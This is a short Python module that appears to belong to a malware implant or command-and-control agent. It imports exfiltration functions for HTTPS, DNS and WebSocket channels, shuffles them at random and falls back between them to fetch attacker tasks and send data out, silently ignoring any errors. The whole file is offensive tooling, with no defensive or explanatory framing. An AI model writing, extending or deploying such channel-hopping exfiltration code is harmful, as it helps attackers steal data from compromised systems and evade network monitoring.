
import random
from core.exfil_https import send_via_https, get_task_https
from core.exfil_dns import send_via_dns, get_task_dns
from core.exfil_ws import send_via_ws, get_task_ws

TRANSPORTS = [
    {"name": "HTTPS", "send": send_via_https, "get": get_task_https},
    {"name": "DNS", "send": send_via_dns, "get": get_task_dns},
    {"name": "WS", "send": send_via_ws, "get": get_task_ws},
]

def fetch_task(agent_id):
    random.shuffle(TRANSPORTS)
    for transport in TRANSPORTS:
        try:
            task = transport["get"](agent_id)
            if task:
                return task
        except:
            continue
    return None

def send_data(agent_id, data_blob):
    random.shuffle(TRANSPORTS)
    for transport in TRANSPORTS:
        try:
            success = transport["send"](agent_id, data_blob)
            if success:
                return True
        except:
            continue
    return False
